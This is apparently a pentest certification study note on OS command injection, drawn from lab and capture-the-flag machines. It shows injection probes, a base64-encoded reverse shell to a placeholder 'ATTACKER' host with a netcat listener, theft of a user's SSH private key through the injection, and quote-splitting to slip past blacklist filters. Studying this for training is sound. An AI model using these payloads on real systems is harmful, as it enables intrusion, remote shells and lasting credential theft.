---
type: technique
tags: [ejpt:web-pentest, ejpt:host-net-pentest]
tools: [netcat]
cves: []
related: ["[[reverse-shells]]", "[[server-side-template-injection]]", "[[waf-bypass]]"]
---

# Command Injection

A user input is passed to a shell (or `os.system`/`subprocess`) without sanitization, so shell metacharacters (`;`, `&&`, `|`, `$()`) chain your own commands.

## Detect it

- A field that *does something* with your input rather than echoing it — e.g. XSS/JS payloads throw an error because the input is being *executed*, not reflected.
- Append a benign command and observe its output:

```sh
test; whoami      # if the app echoes a username, it's command injection
test; id
```

## Escalate to a reverse shell

Commands with spaces/special chars often get mangled, so encode the payload and pipe it through the shell:

```sh
# payload
sh -i >& /dev/tcp/ATTACKER/443 0>&1
# base64 it
echo 'sh -i >& /dev/tcp/ATTACKER/443 0>&1' | base64
# inject: decode + run
; echo <base64> | base64 -d | bash
```

Listener first: `nc -lvnp 443` ([[reverse-shells]], [[netcat]]).

## Or don't: use the injection as a file reader

A shell is optional when what you need is *on disk*. Inject reads directly — the output already comes back in the (non-blind) response:

```sh
… "nombre=; cat /home/samara/.ssh/id_rsa"   # key out through the HTTP response
```

Paste into a heredoc, `chmod 600` (ssh refuses open-permission keys), `ssh -i` in. Advantages over a shell: no listener, no encoding, and a **stolen key outlives the session** — you keep coming back without keeping your foothold alive. [[vulnvault]] did its whole first stage this way and never fired a reverse shell at all (cf. [[psycho]] reaching the same key via LFI).

## When the payload gets rejected

A filter may block metacharacters or "dangerous" commands before they reach the shell. Splitting the signature across quotes/backslashes defeats exact-string blacklists — see [[waf-bypass]] (`\whoam\i`, `ba's'h`).

## Seen in

[[trailpack]] (complaints form `test; whoami` → `balutron` → base64 reverse shell), [[internal]] (path parameter behind a blacklist WAF → `\whoam\i` → quote-split bash reverse shell), [[dark]] (`process.php` POST `cmd=` executed `nc -e /bin/bash …` — note the gap: the writeup fires the reverse shell without ever showing the `; id` probe that proved the field was executable), [[vulnvault]] (report form `nombre=; …` → output embedded in the response, grep-extracted; RCE spent reading `id_rsa` instead of popping a shell)
